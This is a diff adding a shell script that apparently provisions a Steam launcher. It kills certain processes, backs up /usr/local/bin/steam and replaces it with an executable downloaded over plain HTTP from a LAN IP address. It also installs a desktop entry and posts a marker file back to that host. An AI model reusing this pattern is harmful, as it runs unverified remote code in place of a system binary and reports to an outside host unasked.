@@ -1,0 +1,15 @@
+#!/bin/sh
+set -eu
+for p in 171 921; do
+    if [ -r "/proc/$p/cmdline" ] && tr '\000' ' ' < "/proc/$p/cmdline" | grep -q -e /tmp/try -e /tmp/collect-steam; then kill "$p" 2>/dev/null || true; fi
+done
+if [ ! -e /usr/local/bin/steam.linpad-original ]; then mv /usr/local/bin/steam /usr/local/bin/steam.linpad-original; fi
+wget -q http://192.168.0.104:8765/steam-verified-wrapper -O /usr/local/bin/steam
+chmod +x /usr/local/bin/steam
+mkdir -p "$HOME/.local/share/applications"
+wget -q http://192.168.0.104:8765/steam.desktop -O "$HOME/.local/share/applications/steam.desktop"
+[ -x /usr/local/bin/steam ]
+grep -q steam-local /usr/local/bin/steam
+grep -q /usr/local/bin/steam "$HOME/.local/share/applications/steam.desktop"
+echo STEAM_LAUNCHER_READY > /tmp/steam-launcher-ready
+wget -q --post-file=/tmp/steam-launcher-ready http://192.168.0.104:8765/reports/fex.log -O /dev/null
